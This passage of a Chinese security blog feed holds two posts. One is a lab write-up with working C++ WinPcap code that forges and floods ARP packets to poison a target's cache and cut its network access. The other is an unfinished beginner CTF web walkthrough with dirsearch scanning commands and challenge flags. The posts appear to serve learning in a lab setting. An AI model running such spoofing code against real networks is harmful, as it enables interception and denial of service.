alt="1565662370836"></p></li><li><p>ARP报文是由14位的以太网首部和28位的ARP请求/应答构成：</p><ul><li>以太网首部如下<ul><li>目标以太网地址(6字节): <code>00:50:56:ef:ad:4f</code></li><li>源以太网地址(6字节): <code>00:0c:29:10:f5:75</code></li><li>帧类型(2字节): <code>0x0806</code>,表示<code>ARP协议帧</code></li></ul></li><li>ARP请求/应答如下<ul><li>硬件类型(4字节): <code>Ethernet(1) / (0x0001)</code>, 表示<code>以太网</code></li><li>协议类型(4字节): <code>IPv4 / (0x0080)</code>, 表示上层协议是<code>IPv4协议</code></li><li>硬件地址长度(1字节): <code>6 / (0x06)</code>, 表示硬件(MAC)地址长度为6字节</li><li>协议地址长度(1字节): <code>4 / (0x04)</code>, 表示协议地址长度为4字节,即<code>IPv4协议</code></li><li>操作码: <code>reply(2) / (0x0002)</code>, <code>1</code>表示<code>ARP请求</code>, <code>2</code>表示<code>ARP</code>应答, <code>3</code>表示<code>RARP</code>请求,<code>4</code>表示<code>RARP</code>应答</li><li>源硬件地址(6字节): <code>00:0c:29:10:f5:75</code>, 表示<code>发送方MAC地址</code></li><li>源IP地址(4字节): <code>192.168.88.131 / (0xc0a85883)</code>, 表示<code>发送方IP地址</code></li><li>目的硬件地址(6字节): <code>00:50:56:ef:ad:4f</code>, 表示<code>接收方MAC地址</code></li><li>目的IP地址(4字节): <code>192.168.88.2 / (0xc0a85802)</code>, 表示<code>接收方IP地址</code></li></ul></li></ul></li><li><p>ARP攻击原理</p><ol><li>电脑A发送ARP请求,请求IP地址为<code>192.168.88.131</code>的电脑B的MAC地址；</li><li>攻击者截获该请求并向电脑A发送一个伪造的ARP响应，告诉电脑A：IP地址为<code>192.168.88.130</code>的电脑B的MAC地址是<code>00:0c:29:01:f5:75</code> (攻击者的MAC地址)；</li><li>电脑A将这个对应关系写入自己的ARP缓存表中，以后发送数据时，将本应该发往电脑B的数据发送给了攻击者；</li><li>同样的，攻击者向电脑B也发送一个伪造的ARP响应，告诉电脑B：电脑A的IP地址<code>192.168.88.130</code>对应的MAC地址是<code>00:0c:29:01:f5:75</code>，电脑B也会将数据发送给攻击者。</li></ol></li></ol><h2 id="Winpacp实现ARP欺骗"><a href="#Winpacp实现ARP欺骗" class="headerlink" title="Winpacp实现ARP欺骗"></a>Winpacp实现ARP欺骗</h2><p>基于Winpcap编写程序，对指定的目标IP地址进行ARP欺骗攻击。</p><h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663142897.png" alt="1565663142897"></p><h3 id="搭建编程环境"><a href="#搭建编程环境" class="headerlink" title="搭建编程环境"></a><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663099808.png" alt="1565663099808">搭建编程环境</h3><ol><li><p>下载安装<code>WinPcap运行库</code>，下载解压<code>WinPcap开发包</code>。</p></li><li><p>打开vs2017,新建<code>windows控制台应用程序</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663229669.png" alt="1565663229669"></p></li><li><p>打开<code>项目属性-&gt;配置属性-&gt;c/c++-&gt;预处理器-&gt;预处理器定义</code>，在其中添加<code>WPCAP</code>、<code>HAVE_REMOTE</code>两个宏定义。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663291347.png" alt="1565663291347"></p></li><li><p>打开<code>项目属性-&gt;配置属性-&gt;链接器-&gt;输入-&gt;附加依赖项</code>添加<code>wpcap.lib</code>和<code>ws2_32.lib</code>两个库。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663338989.png" alt="1565663338989"></p></li><li><p>打开<code>项目属性-&gt;配置属性-&gt;VC++目录-&gt;包含目录</code>和同级的<code>库目录</code>分别添加之前下载解压的<code>WinPcap开发包</code>的<code>Include目录</code>和<code>Lib目录</code>路径。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663408382.png" alt="1565663408382"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663414285.png" alt="1565663414285"></p></li><li><p>调用相关的WinPcap库进行代码编写，设置Kali为靶机，查找攻击机，靶机和攻击机的IP地址、MAC地址（伪造地址是执行程序时输入的）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 确定IP地址和MAC地址 */</span></span><br><span class="line">CONSTUCHARdst_mac[<span class="number">6</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x29</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0x75</span> &#125;;<span class="comment">//被攻击方的MAC</span></span><br><span class="line">CONSTUCHARgateway_mac[<span class="number">6</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x56</span>, <span class="number">0xEF</span>, <span class="number">0xAD</span>, <span class="number">0x4F</span> &#125;; <span class="comment">//网关的MAC</span></span><br><span class="line">CONSTUCHARsrc_mac[<span class="number">6</span>] = &#123; <span class="number">0xDE</span>, <span class="number">0x1A</span>, <span class="number">0x1A</span>, <span class="number">0xF3</span>, <span class="number">0x88</span>, <span class="number">0x83</span> &#125;;<span class="comment">//攻击者的MAC</span></span><br><span class="line">CONSTCHARdst_ip[] = <span class="string">"192.168.88.130"</span>;<span class="comment">//被攻击方IP</span></span><br><span class="line">CONSTCHARgateway_ip[] = <span class="string">"192.168.88.2"</span>;<span class="comment">//网关IP </span></span><br><span class="line">CHARforged_mac[<span class="number">6</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;<span class="comment">//伪造MAC</span></span><br><span class="line">CHARforged_ip[] = <span class="string">"0.0.0.0"</span>;<span class="comment">//伪造IP</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ol><li><p>构造ARP数据包</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 构造ARP包 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)<span class="comment">//结构体字节长度是一的倍数，不可省略</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">arp_packet</span> &#123;</span></span><br><span class="line">UCHARether_dhost[<span class="number">6</span>];<span class="comment">//目标以太网地址 </span></span><br><span class="line">UCHARether_shost[<span class="number">6</span>];<span class="comment">//源以太网地址 </span></span><br><span class="line">USHORTether_type;<span class="comment">//以太网类型</span></span><br><span class="line">USHORThardware_type;<span class="comment">//硬件类型</span></span><br><span class="line">USHORTprotocol_type;<span class="comment">//协议类型</span></span><br><span class="line">USHORThardware_protocol_len;<span class="comment">//硬件地址和协议地址长度第一个字节时硬件地址长度,第二个字节时协议地址长度</span></span><br><span class="line">USHORTopcode;<span class="comment">//操作码</span></span><br><span class="line">UCHARsrc_hrd_addr[<span class="number">6</span>];<span class="comment">//源硬件地址</span></span><br><span class="line">ULONGsrc_ip;<span class="comment">//源IP地址</span></span><br><span class="line">UCHARdst_hrd_addr[<span class="number">6</span>];<span class="comment">//目标硬件地址</span></span><br><span class="line">ULONGdst_ip;<span class="comment">//目标IP地址</span></span><br><span class="line">&#125; ARP_PKT;</span><br></pre></td></tr></table></figure></li><li><p>获得本地计算机上所有的网络设备表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*获得本地计算机上所有的网络设备表*/</span></span><br><span class="line">pcap_findalldevs(&amp;alldevs, errbuf)</span><br></pre></td></tr></table></figure></li><li><p>打开网卡</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 打开网卡 */</span></span><br><span class="line">pcap_open(d-&gt;name,<span class="number">65536</span>,PCAP_OPENFLAG_PROMISCUOUS,<span class="number">1000</span>,<span class="literal">NULL</span>,errbuf))</span><br></pre></td></tr></table></figure></li><li><p>释放设备列表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 释放设备列表 */</span></span><br><span class="line">pcap_freealldevs(alldevs)</span><br></pre></td></tr></table></figure></li><li><p>发送ARP数据包</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 发送ARP包 */</span></span><br><span class="line">pcap_sendpacket(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)&amp;pkt, <span class="keyword">sizeof</span>(ARP_PKT))</span><br></pre></td></tr></table></figure></li></ol><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><ol><li><p>打开靶机，利用命令行<code>arp -n</code>查看<code>ARP缓存</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664387481.png" alt="1565664387481"></p></li><li><p>打开程序，进行ARP欺骗(伪造的MAC地址为<code>1A-1A-1A-1A-1A-1A</code>，伪造的IP地址为<code>88.88.88.88</code>，发送ARP包<code>1000</code>个，发送间隔<code>100ms</code>)。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664404355.png" alt="1565664404355"></p></li><li><p>攻击结束后再次利用命令行<code>arp -n</code>查看ARP缓存，发现<strong>多了一条缓存</strong>，IP地址为<code>88.88.88.88</code>，MAC地址为<code>1A-1A-1A-1A-1A-1A</code>, 与伪造的相同，攻击成功。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664411960.png" alt="1565664411960"></p></li></ol><h4 id="禁止上网"><a href="#禁止上网" class="headerlink" title="禁止上网"></a>禁止上网</h4><ol><li><p>用靶机打开<a href="http://www.taobao.com" target="_blank" rel="noopener">www.taobao.com</a>，并ping百度域<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>，可正常上网。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664449611.png" alt="1565664449611"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664459530.png" alt="1565664459530"></p></li><li><p>打开程序，进行禁止上网攻击(伪造MAC地址为<code>90-90-90-90-90-90</code>，发送ARP包<code>1000</code>个，发送间隔<code>100ms</code>) </p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664524204.png" alt="1565664524204"></p></li><li><p>在攻击过程中打开<a href="http://www.taobao.com" target="_blank" rel="noopener">www.taobao.com</a>，并ping百度域<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>,无法上网。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664536161.png" alt="1565664536161"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664544848.png" alt="1565664544848"></p></li><li><p>在攻击过程中使用wareshark抓包。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664561633.png" alt="1565664561633"></p></li><li><p>分析ARP包结构，发现源MAC地址是伪造的MAC地址，ARP包没有错误。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664628262.png" alt="1565664628262"></p></li></ol><h4 id="IP冲突攻击"><a href="#IP冲突攻击" class="headerlink" title="IP冲突攻击"></a>IP冲突攻击</h4><ol><li><p>用靶机打开<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>，并ping百度域名<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>,<br>可正常上网。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664726685.png" alt="1565664726685"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664731112.png" alt="1565664731112"></p></li><li><p>打开程序，进行禁止上网攻击(发送ARP包<code>1000</code>个，发送间隔<code>100ms</code>) 。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664745324.png" alt="1565664745324"></p></li><li><p>在攻击过程中打开<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>，并ping百度域名<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>,<br>无法上网。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664753049.png" alt="1565664753049"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664758887.png" alt="1565664758887"></p></li><li><p>在攻击过程中使用wareshark抓包, 分析ARP包结构，靶机的IP地址对应的是攻击机的MAC地址，由于无法查看网关上的ARP列表，根据接收的ARP包的信息和无法上网可以判断网关ARP列表上会出现靶机IP地址对应两个MAC地址的现象，一个靶机的MAC地址，一个攻击机的MAC地址，即实现了IP冲突攻击。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664793294.png" alt="1565664793294"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664799061.png" alt="1565664799061"></p></li></ol><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>​        ARP欺骗的原理是由于<strong>局域网的网络传输并不是通过IP而是通过mac地址</strong>，因此模拟出一个不存的mac地址进行收发数据，这样会导致不能正常的进行网络通信。本实验是基于WinPcaP的，实验过程熟悉了WinPcaP的安装配置方法。ARP攻击其实会导致很严重的后果，那么如何防范ARP攻击，这就是需要思考的问题，目前了解的方法有清空ARP缓存和指定ARP对应关系。</p><h3 id="实验核心代码"><a href="#实验核心代码" class="headerlink" title="实验核心代码"></a>实验核心代码</h3><p><a href="https://download.csdn.net/download/weixin_41936557/11538034" target="_blank" rel="noopener">点击下载程序源代码</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 选择网卡接口 */</span></span><br><span class="line"><span class="keyword">if</span> (select_adapters(&amp;handle) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 选择攻击方式 */</span></span><br><span class="line">start_attacking:</span><br><span class="line"><span class="keyword">switch</span> (select_attackmethod())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">goto</span> location_1; <span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">goto</span> location_2; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:<span class="keyword">goto</span> location_3; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">-1</span>;<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pcap_if_t</span>*alldevs;<span class="comment">//获取到的网络设备列表</span></span><br><span class="line"><span class="keyword">pcap_if_t</span>*d;<span class="comment">//指向的一个网络设备</span></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* 检索设备列表 */</span></span><br><span class="line"><span class="keyword">if</span> (pcap_findalldevs(&amp;alldevs, errbuf) == <span class="number">-1</span>)<span class="comment">//pcap_findalldevs获得本地计算机上所有的网络设备列表</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"检索设备列表错误: %s\n"</span>, errbuf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 打印设备列表 */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"所有网络设备如下：\n"</span>);</span><br><span class="line"><span class="keyword">for</span> (d = alldevs; d; d = d-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d. %s"</span>, ++i, d-&gt;name);</span><br><span class="line"><span class="keyword">if</span> (d-&gt;description)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" (%s)\n"</span>, d-&gt;description);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" (没有合适的描述)\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n没有发现设备！\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"请输入设备编号 (1-%d): "</span>, i);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num);</span><br><span class="line"><span class="keyword">if</span> (num &lt; <span class="number">1</span> || num &gt; i)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"接口编号不在列表范围内，请重新输入 (1-%d)："</span>, i);</span><br><span class="line">&#125; <span class="keyword">while</span> (num &lt; <span class="number">1</span> || num &gt; i);</span><br><span class="line"><span class="comment">/* 跳转到已选设备 */</span></span><br><span class="line"><span class="keyword">for</span> (d = alldevs, i = <span class="number">0</span>; i &lt; num - <span class="number">1</span>; d = d-&gt;next, i++);</span><br><span class="line"><span class="comment">/* 打开网卡 */</span></span><br><span class="line"><span class="keyword">if</span> ((*handle = pcap_open(d-&gt;name,<span class="comment">// 设备名</span></span><br><span class="line"><span class="number">65536</span>,<span class="comment">// 要捕获的数据包的哪一部分,65536保证能捕获到不同数据链路层上的每个数据包上的全部内容</span></span><br><span class="line">PCAP_OPENFLAG_PROMISCUOUS,<span class="comment">// 混杂模式</span></span><br><span class="line"><span class="number">1000</span>,<span class="comment">// 读取超时时间</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 远程机器验证</span></span><br><span class="line">errbuf<span class="comment">// 错误缓冲</span></span><br><span class="line">)) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n无法打开网卡. %s 不支持WinPcap！\n"</span>);</span><br><span class="line">pcap_freealldevs(alldevs);<span class="comment">//释放设备列表</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 填充ARP包 */</span></span><br><span class="line">ARP_PKTpkt;<span class="comment">//ARP包</span></span><br><span class="line"><span class="built_in">memcpy</span>(pkt.ether_dhost, dst_mac, <span class="number">6</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pkt.ether_shost, forged_mac, <span class="number">6</span>);</span><br><span class="line">pkt.ether_type = ::htons(<span class="number">0x0806</span>);</span><br><span class="line">pkt.hardware_type = htons(<span class="number">0x0001</span>);</span><br><span class="line">pkt.protocol_type = htons(<span class="number">0x0800</span>);</span><br><span class="line">pkt.hardware_protocol_len = htons(<span class="number">0x0604</span>);</span><br><span class="line">pkt.opcode = htons(<span class="number">0x0001</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pkt.src_hrd_addr, forged_mac, <span class="number">6</span>);</span><br><span class="line">pkt.src_ip = inet_addr(forged_ip);</span><br><span class="line"><span class="built_in">memcpy</span>(pkt.dst_hrd_addr, dst_mac, <span class="number">6</span>);</span><br><span class="line">pkt.dst_ip = inet_addr(dst_ip);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 发送ARP包 */</span></span><br><span class="line"><span class="keyword">while</span> (send_num &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pcap_sendpacket(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)&amp;pkt, <span class="keyword">sizeof</span>(ARP_PKT)) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ARP包发送错误: \n"</span>, pcap_geterr(handle));</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">Sleep(interval);<span class="comment">//设定间隔时间</span></span><br><span class="line">send_num--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP欺骗 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> winpcap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界WEB入门练习题Write up</title>
      <link href="/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWEB%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0%E9%A2%98Write-up.html"/>
      <url>/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWEB%E5%85%A5%E9%97%A8%E7%BB%83%E4%B9%A0%E9%A2%98Write-up.html</url>
      
        <content type="html"><![CDATA[<p>菜鸟入坑WEB，总结了攻防世界WEB新手入门题目的解题思路，供初学者参考。<a id="more"></a></p><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>右键无法使用，即右键无法查看网页源码，故尝试使用浏览器开发者工具</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>Firefox</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>使用Firefox打开网页，按下F12，跳转到开发者模式，使用查看器查看网页源码，得到flag为<code>cyberpeace{abe8c9af5df02f72f83dde7d362c7df6}</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564381171925.png" alt="1564381171925"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>http的数据请求post和get原理</p><h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><p>Firefox、HackBar</p><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>在Firefox浏览器中打开网页，提示要用GET方式提交一个值为1的变量a</p></li><li><p>使用HackBar通过get方式提交变量a=1,或者直接在URL输入框中输入<code>http://111.198.29.45:40308?a=1</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564388248797.png" alt="1564388248797"></p></li><li><p>根据提示继续以GET的方式提交a=1并以POST的方式提交值为2的变量b（勾选Post data即可）,返回flag为<code>cyberpeace{e0619fdbb17fe505fcded7b3869b9495}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564388398442.png" alt="1564388398442"></p></li></ol><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>robots.txt文件是一个协议，是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p><h3 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h3><p>目录爆破工具<a href="https://github.com/evilsocket/dirsearch" target="_blank" rel="noopener">dirserach</a></p><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h3><ol><li>查看源码，没有提示，根据提示robots协议，想到flag可能会存储在<code>robots.txt</code>上</li><li>通过目录爆破工具<a href="https://github.com/evilsocket/dirsearch" target="_blank" rel="noopener">dirserach</a>扫描网站目录：<code>python3 dirsearch.py -u &quot;http://111.198.29.45:55654/&quot; -e *</code>，扫描到robots.txt文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564409074044.png" alt="1564409074044"></li><li>访问<code>http://111.198.29.45:55654/robots.txt</code>，发现<code>Disallow: f1ag_1s_h3re.php</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564409225599.png" alt="1564409225599"></li><li>继续在URL中输入<code>http://111.198.29.45:55654/f1ag_1s_h3re.php</code>，尝试访问<code>f1ag_1s_h3re.php</code>，结果得到flag为<code>cyberpeace{841741b0c0780a80f91f6cd1148d0373}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564409361854.png" alt="1564409361854"></li></ol><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>常见的备份文件后缀名有: <code>.git</code> <code>.svn</code> <code>.swp</code> <code>.svn</code> <code>.~</code> <code>.bak</code> <code>.bash_history</code></p><h3 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h3><p>目录爆破工具<a href="https://github.com/evilsocket/dirsearch" target="_blank" rel="noopener">dirserach</a>，<a href="https://notepad-plus-plus.org/" target="_blank" rel="noopener">notepad++</a></p><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤"></a>步骤</h3><ol><li>查看源码，没有提示，根据提示忘记删除备份文件提示，想到flag可能会存储在备份文件上。</li><li>通过目录爆破工具<a href="https://github.com/evilsocket/dirsearch" target="_blank" rel="noopener">dirserach</a>扫描网站目录：<code>python3 dirsearch.py -u &quot;http://111.198.29.45:37766/&quot; -e *</code>，扫描到index.php.bak备份文件<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564632397780.png" alt="1564632397780"></li><li>继续在URL中输入<code>http://111.198.29.45:37766/index.php.bak</code>，讲备份文件保存到本地后使用<a href="https://notepad-plus-plus.org/" target="_blank" rel="noopener">notepad++</a>打开，发现flag为<code>cyberpeace{899ad51ca546f7e97b7f3f8f02d4e180}</code><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1564632691681.png" alt="1564632691681"></li></ol><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>Cookie是当主机访问Web服务器时，由 Web 服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 